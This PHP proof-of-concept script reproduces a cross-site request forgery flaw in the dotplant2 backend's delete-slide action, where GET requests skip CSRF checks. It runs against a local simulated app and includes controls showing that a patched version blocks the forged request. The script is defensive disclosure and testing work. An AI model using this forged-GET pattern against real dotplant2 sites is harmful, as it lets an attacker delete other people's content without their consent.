<?php
require __DIR__ . '/vulnerable_app/slider_delete_slide_sim.php';

function out(string $message): void { echo $message . PHP_EOL; }
function pretty(mixed $value): string { return json_encode($value, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES) ?: 'null'; }
function assert_true(bool $condition, string $message): void { if (!$condition) { fwrite(STDERR, "[FAIL] {$message}\n"); exit(1); } }

out('[*] PoC context:');
out(pretty([
    'project' => 'DevGroup-ru/dotplant2',
    'poc_name' => 'dotplant2_delete_slide_missing_verbfilter',
    'finding' => 'CAND-78787ea6a618',
    'vulnerability' => 'Authenticated CSRF / unsafe GET delete-slide',
    'root_cause' => [
        'SliderController::behaviors() has AccessControl but no VerbFilter for actionDeleteSlide($id)',
        'Yii CSRF validation does not protect GET requests',
    ],
    'safety' => 'Local-only simulation; it deletes only in-memory slide state.',
]));

$state = new SliderState();
$vulnerable = new VulnerableSliderApp($state);

out("\n[*] Initial state:");
out(pretty(slider_snapshot($state)));

out("\n[*] Attack: forged cross-site GET to /backend/slider/delete-slide?id=101 as a content manager, without CSRF token.");
$attack = new RequestSim(
    method: 'GET',
    route: '/backend/slider/delete-slide',
    params: ['id' => 101],
    roles: ['content manage'],
    csrfToken: null
);
$response = $vulnerable->dispatch($attack);
out('[*] Vulnerable response:');
out(pretty($response->toArray()));
out('[*] State after vulnerable request:');
out(pretty(slider_snapshot($state)));
assert_true($response->status === 302, 'Vulnerable delete-slide should redirect after deletion.');
assert_true(!isset($state->slides[101]), 'Slide 101 should be deleted by tokenless GET.');
assert_true(isset($state->sliders[5]), 'Parent slider should remain after deleting only one slide.');
assert_true($state->csrfChecks === 0, 'GET delete-slide should skip Yii CSRF validation.');
out('[PASS] Vulnerability reproduced: tokenless GET deleted slide 101.');

$state->reset();
$vulnerable = new VulnerableSliderApp($state);
out("\n[*] Control 1: POST delete-slide without CSRF token against vulnerable app.");
$postNoToken = new RequestSim(
    method: 'POST',
    route: '/backend/slider/delete-slide',
    params: ['id' => 101],
    roles: ['content manage'],
    csrfToken: null
);
$postNoTokenResponse = $vulnerable->dispatch($postNoToken);
out('[*] Vulnerable POST without token response:');
out(pretty($postNoTokenResponse->toArray()));
out('[*] State after POST without token:');
out(pretty(slider_snapshot($state)));
assert_true($postNoTokenResponse->status === 403, 'POST without CSRF token should be rejected.');
assert_true(isset($state->slides[101]), 'Rejected POST should not delete slide 101.');
assert_true($state->csrfChecks === 1 && $state->csrfFailures === 1, 'Non-GET request should be CSRF-checked.');
out('[PASS] Control passed: normal unsafe methods are CSRF-protected; the bug is GET dispatch without VerbFilter.');

$state->reset();
$patched = new PatchedSliderApp($state);
out("\n[*] Control 2: same forged GET against patched app.");
$patchedGet = $patched->dispatch($attack);
out('[*] Patched GET response:');
out(pretty($patchedGet->toArray()));
out('[*] State after patched GET:');
out(pretty(slider_snapshot($state)));
assert_true($patchedGet->status === 405, 'Patched delete-slide should reject GET.');
assert_true(isset($state->slides[101]), 'Patched GET should not delete slide 101.');
out('[PASS] Patched control passed: VerbFilter-style method enforcement blocks GET delete-slide.');

$state->reset();
$patched = new PatchedSliderApp($state);
out("\n[*] Positive control: legitimate POST delete-slide with valid CSRF token.");
$legit = new RequestSim(
    method: 'POST',
    route: '/backend/slider/delete-slide',
    params: ['id' => 101],
    roles: ['content manage'],
    csrfToken: 'valid-yii-csrf-token'
);
$legitResponse = $patched->dispatch($legit);
out('[*] Patched legitimate response:');
out(pretty($legitResponse->toArray()));
out('[*] State after legitimate POST:');
out(pretty(slider_snapshot($state)));
assert_true($legitResponse->status === 302, 'Patched POST with valid CSRF should allow intended delete-slide.');
assert_true(!isset($state->slides[101]), 'Legitimate patched POST should delete slide 101.');
assert_true($state->csrfChecks === 1 && $state->csrfFailures === 0, 'Legitimate POST should pass CSRF validation.');
out('[PASS] Positive control passed: intended POST + CSRF still works.');

out("\nVULNERABLE: dotplant2_delete_slide_missing_verbfilter reproduced successfully.");
